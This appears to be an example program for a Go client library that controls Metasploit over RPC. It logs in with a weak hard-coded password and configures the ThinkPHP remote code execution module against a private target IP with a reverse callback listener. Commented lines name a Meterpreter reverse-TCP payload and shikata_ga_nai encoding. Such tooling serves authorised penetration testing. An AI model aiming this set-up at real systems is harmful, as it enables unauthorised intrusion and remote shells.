package main

import (
	"fmt"
	"github.com/iami317/gomsf"
)

func main() {
	client, err := gomsf.New("0.0.0.0:55553")
	if err != nil {
		panic(err)
	}

	if err = client.Login("msf", "123456"); err != nil {
		panic(err)
	}
	defer client.Logout()

	if err = client.HealthCheck(); err != nil {
		panic(err)
	}

	//version, err := client.Core.Version()
	//exploits, err := client.Module.Exploits()
	//architectures, err := client.Module.Architectures()
	//platforms, err := client.Module.Platforms()
	//payloads, err := client.Module.Payloads()
	//posts, err := client.Module.Posts()
	//auxiliaries, err := client.Module.Auxiliaries()
	//nops, err := client.Module.Nops()
	//evasions, err := client.Module.Evasions()
	//moduleInfo, err := client.Module.Info(gomsf.PayloadType, "windows/meterpreter/reverse_tcp")
	//encoded, err := client.Module.Encode("AAAA", "x86/shikata_ga_nai", &gomsf.EncodeOptions{
	//	Format: "c",
	//})

	exploit, err := client.Module.UseExploit("unix/webapp/thinkphp_rce")
	err = exploit.Set("RHOSTS", "192.168.100.149")
	if err != nil {
		fmt.Println(err)
	}
	exploit.Set("RPORT", "8081")
	exploit.Set("TARGETURI", "/")
	exploit.Set("SRVHOST", "0.0.0.0")
	exploit.Set("SRVPORT", "8080")
	exploit.Set("LHOST", "192.168.0.199")
	exploit.Set("LPORT", "4444")
	//options := exploit.OptionsAdvanced()
	//detail := exploit.OptionsDetail()
	fmt.Println(exploit.Get("RHOSTS"))
}
